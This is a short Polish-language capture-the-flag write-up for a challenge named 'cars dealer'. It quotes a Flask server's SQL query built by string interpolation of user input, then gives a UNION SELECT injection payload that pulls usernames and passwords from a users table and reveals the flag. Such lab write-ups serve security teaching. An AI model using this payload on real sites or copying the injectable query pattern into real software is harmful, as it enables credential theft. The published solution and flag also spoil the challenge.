# cars dealer
![](images/a0f8055088be63cc3bc1ce5b04fb3500)

W opisie jest ukryta podpowiedź, że należy użyć SELECT UNION.
Po otwarciu strony http://challenges.wsi.edu.pl:5001 pojawia się prosta strona.
![](images/9c90637bfb31b24c5c49c8fa9f27342f)
W pliku "src.zip" dołączonym do zadania, znajduje się plik "init.sql".
Interesujący nas fragment to:
```
INSERT INTO users (username, password) VALUES
('admin', 'flag{this_is_a_fake_flag}'),
```
Trzeba wymyśleć sposób na dostanie się do tabeli `users`.

W pliku "server.py" w "src.zip" znajduje się kluczowy fragment kodu.
```
    page = request.args.get('page', 1, type=int)
    per_page = request.args.get('per_page', 10, type=int)
    search_term = request.args.get('search', '')

sql_query = f"SELECT * FROM cars WHERE brand \
            ILIKE '%%{search_term}%%' OR \
            model ILIKE '%%{search_term}%%' OR \
            engine ILIKE '%%{search_term}%%' OR \
            year::text ILIKE '%%{search_term}%%' \
        ORDER BY id LIMIT {per_page} OFFSET {(page - 1) * per_page};"

```
W tym przypadku należy wykonać SQL Injection. Skonstruowałem taki kod używający wyżej wymieniony SELECT UNION. Należy powtórzyć kolumny kilkakrotnie, aby UNION przeszedł.

```a%%' UNION SELECT id, username, password, password, id from users WHERE id=1 --```

Po wpisaniu tego kodu pojawia się tabela zawierająca flagę.
![](images/0d2e6814ea6034d35260c3151d6f9de5)

Flaga: `WSIZ{teSLA_is_c00l_as_f@sttt}`